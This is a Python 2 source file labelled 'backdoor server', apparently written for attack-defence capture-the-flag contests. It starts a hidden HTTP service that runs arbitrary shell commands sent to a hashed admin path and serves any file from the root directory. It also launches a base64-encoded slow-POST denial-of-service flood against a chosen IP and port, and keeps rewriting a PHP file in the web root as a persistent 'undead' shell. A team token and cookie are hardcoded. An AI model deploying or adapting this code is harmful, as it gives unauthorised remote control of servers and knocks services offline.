#!/usr/bin/env python2

'''

@name backdoor server
@author haozigege@Lancet
@version v0.0
@time 2018.9

This tool is utilized as a service to store the flag in queue, and then to send them 
at a certain speed.

Here are the routes:
/$hash:   to download file
/$hash/ddos: to start the ddos attack against some server
/$hash/shell: to get the report of the shell scan(including the malicious )
/$hash/cmd: to execute the cmd sent by the client
/$hash/state: to get the resource state of some target
/$hash/waf: to get the report of the waf

active processes:
1. get flag and submit (u should ensure the server could connect to the flag server)
2. check the webshell and generate it if not exists


'''

import os
import socket
import sys
import SimpleHTTPServer
import SocketServer
import cgi
import re
from time import gmtime, strftime
import threading 
import Queue
from urlparse import parse_qs,urlparse
import time
import subprocess
import signal
import base64

reload(sys)  
sys.setdefaultencoding('utf8')



###### configuration #######

# the listen port
listen_port = 8888

# remote flag submit	
remote_flag_url = 'https://172.16.4.1/Common/awd_sub_answer'

# team token
token = '3b72366f3d32af726342e3242e6bcfe8'

# team cookie
team_cookie = {"phpsessid":"haozigege"}

# flag submit span
flag_span = 100

# request timeout 
time_out = 4

# admin router for file manager
admin_router = '/3aae0208b6deb94be6bb0a6b153187f4'

# file manager base
dir_base = '/'

# shell scan log
shell_log_file = './.shell_log'

# shell scan path
scan_path = '/var/www/html'


# routers
routers = ['/ddos','/shell','/cmd','/state']

# undead shell path
shell_path = '/var/www/html/.1.php'

# undead shell content
shell_content = "<?php phpinfo();?>\r"
shell_content =  shell_content + ' ' * len(shell_content) + "\n"

# running threads
thread_array = {}

# spawn shell pids
shell_pids = []

############################



######### global functions #############

def g_undead_shell():
	'''
		generate undead shell
	'''
	while True:
		open(shell_path,'w').write(shell_content)
		time.sleep(30)


def ddos_thread(ip,port):
	'''
		using extremely large http content-length to ddos

	'''
	python_script = '''#!/usr/bin/env python
import socket
import time
import sys
import threading
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=200000
PORT= {{port}}
HOST= '{{ip}}'
PAGE= '/'
#---------------------------

buf=("POST %s HTTP/1.1\\r\\n"
"Host: %s\\r\\n"
"Content-Length: 10000000\\r\\n"
"Keep-Alive: 900\\r\\n"
"Cookie: hack by Redbud\\r\\n"
"\\r\\n" % (PAGE,HOST))

socks=[]

def conn_thread():
	global socks
	for i in range(0,MAX_CONN):
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((HOST,PORT))
			s.send(buf)
			print "Send buf OK!,conn=%d\\n"%i
			socks.append(s)
		except Exception,ex:
			print "Could not connect to server or send error:%s"%ex
			time.sleep(10)
#end def

def send_thread():
	global socks
	while True:
		for s in socks:
			try:
				s.send("f")
				print "send OK!"
			except Exception,ex:
				print "Send Exception:%s\\n"%ex
				socks.remove(s)
				s.close()
		time.sleep(1)
#end def

for i in xrange(2):
		conn_th=threading.Thread(target=conn_thread,args=())
		send_th=threading.Thread(target=send_thread,args=())
		conn_th.start()
		send_th.start()'''.replace('{{ip}}',ip).replace('{{port}}',port)

	python_script = base64.b64encode(python_script)

	p = subprocess.Popen('echo %s | base64 -d|python'%python_script,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	shell_pids.append(p.pid)



########################################


class CustomHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

	def do_GET(self):
		self.my_main_handle()

	def do_POST(self):
		self.my_main_handle()

	def admin_handle(self):
		'''
		play with the http data 
	
		'''

		# some error might happen when u try to enter a folder without /
		if not self.path.startswith(admin_router + '/'):
			self.send_response(301)
			self.send_header('Location', admin_router + '/')
			self.end_headers()

		# normal file list
		real_path = dir_base + self.path[len(admin_router):]
		if not real_path:
			real_path = dir_base + '/'
		if os.path.isdir(real_path):
			f = self.list_directory(real_path)
			self.copyfile(f, self.wfile)
		elif os.path.exists(real_path):
			# I am sure it's a normal file
			f = open(real_path,'rb')
			self.send_response(200)
			self.send_header('Content-type', 'text/html')
			self.end_headers()
			self.copyfile(f, self.wfile)
		return 


	def error_handle(self,msg):
		self.send_response(404)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
		self.wfile.write(msg)

	def success_handle(self,msg):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
		self.wfile.write(msg)



	def cmd_handle(self,params):
		'''
			run the cmd send from the client
		'''

		if params.has_key('cmd'):
			cmd = params['cmd'][0]
			# cmd = cmd.split(" ")
			start = time.time()
			process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			while process.poll() is None:
				time.sleep(0.2)
				now = time.time()
				if (now - start) > time_out:
					os.kill(process.pid, signal.SIGKILL)
					os.waitpid(-1, os.WNOHANG)
					self.success_handle('process runtime exhausts')
					return 
			res = process.stdout.read()
			self.success_handle(res)

		else:
			self.success_handle('server alive')


	def state_handle(self,params):
		'''
			to get the state of the remote server
		
		'''

		cmd = '''#!/bin/bash
#get cpu number
cpu_no=`grep -c 'model name' /proc/cpuinfo`  

#get averge load in 15min
avg_load=`uptime | awk '{print $NF}'` 

#get current cpu occupy
idle=`top -b -n 1 | grep Cpu | awk -F ',' '{print $4}' | cut -f 1 -d "."`
cpu_load=$((100-$idle))

#get free memory
free_mem=$(free -m |grep - |awk -F : '{print $2}' |awk '{print $2}')

#get total memory:
all_mem=$(($(cat /proc/meminfo |grep 'MemTotal' |awk -F : '{print $2}' |sed 's/^[ \t]*//g'|cut -f 1 -d " ")/(1024)))


#get free disk
free_dk=$(($(df /| awk '/\//{print$4}')/(1024)))

#get total disk 
all_dk=$(($(df /| awk '/\//{print$2}')/(1024)))

#get the tcp listening ports 
tcp_ports=`netstat -an|grep LISTEN|egrep "0.0.0.0|:::"|awk '/^tcp/ {print $4}'|awk -F: '{print $2$4}' | sort -n| paste -d "," -s`

#get the udp listening ports
udp_ports=`netstat -an|grep udp|awk '{print $4}'|awk -F: '{print $2}'|sed '/^$/d'|sort -n | paste -d "," -s`

#print res
my_columns=("cpu_no" "avg_load" "cpu_load" "free_mem" "all_mem" "free_dk" "all_dk")
for column in ${my_columns[@]}
do
printf "|%-10s" $column
done

echo ""

my_results=($cpu_no $avg_load $cpu_load $free_mem $all_mem $free_dk $all_dk)
for result in ${my_results[@]}
do
printf "|%-10s" $result
done

echo ""

printf "tcp_listen: %s\n" $tcp_ports
printf "udp_listen: %s\n" $udp_ports'''

		cmd = base64.b64encode(cmd)
	
		# the popen originally use sh, but we need bash here
		res = os.popen('echo %s |base64 -d|/bin/bash' %cmd).read()
		self.success_handle(res)
		return


	def shell_handle(self,params):
		'''
			return the results created by shell scan

		'''

		if os.path.exists(shell_log_file):
			self.success_handle(open(shell_log_file).read())
		else:
			self.error_handle('error: ' + shell_log_file + ' does not exist')
		
	def ddos_handle(self,params):
		'''
			for ddos attack against other server
		'''	
		if params.has_key('ip') and params.has_key('port'):

			ip = params['ip'][0]
			port = params['port'][0]
			tgt_socket = ip + ':' + str(port)

			# start a thread for ddos attack
			thread_name ='ddos_' + str(int(time.time()))
			t = threading.Thread(target=ddos_thread,args=(ip,port),name=thread_name)
			t.setDaemon(True)
			t.start()

			# you'd better not attack the same target
			if thread_array.has_key(tgt_socket):
				thread_array[tgt_socket + '_' + str(int(time.time()))] = t
			else:
				thread_array[tgt_socket] = t


			msg = "start a new thread to attack %s\n"%tgt_socket
			for t in thread_array:
				if 'ddos' in thread_array[t].name:
					msg +=  thread_array[t].name + ' => ' + t + "\n"

			self.success_handle(msg)
			

		else:
			self.error_handle('error: insufficient args')



	def my_main_handle(self):
		'''
		handle with the payload
		'''

		# with that admin url prefix, we can be authorized with admin priv
		if self.path.startswith(admin_router):

			# substract the route from the url
			path = urlparse(self.path).path

			# the urlparse uses the ';' as separator, so encode it
			params = parse_qs(urlparse(self.path).query.replace(';','%3b'))

			my_route = path[len(admin_router):]


			if my_route in routers and hasattr(self,my_route[1:] + '_handle'):
				my_handle = getattr(self,my_route[1:] + '_handle')
				my_handle(params)
				return

			else:
				self.admin_handle()
				return

		# 404 not found
		self.error_handle('404 not found')


# update the server_bind function to reuse the port 
class MyTCPServer(SocketServer.TCPServer):
	def server_bind(self):
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.bind(self.server_address)


t = threading.Thread(target=g_undead_shell,name='g_undead_shell')
t.setDaemon(True)
t.start()
thread_array['g_undead_shell'] = t



httpd = MyTCPServer(("", listen_port), CustomHTTPRequestHandler)
print "serving at port", listen_port

try:

	httpd.serve_forever()

except KeyboardInterrupt:

	print '[*] killed by user'
	# stop threads
	# for t in thread_array:
	# 	thread_array[t]._Thread__stop()

	# stop spawn shell
	for pid in shell_pids:

		# get the spid, and kill them all, avoid the formation of orphan process
		spids = os.popen('ps -o pid --ppid %d --noheaders' % pid).readlines()
		for spid in spids:
			spid = int(spid)
			os.kill(spid, signal.SIGKILL)
			os.waitpid(-1, os.WNOHANG)

		os.kill(pid, signal.SIGKILL)
		os.waitpid(-1, os.WNOHANG)



	sys.exit()













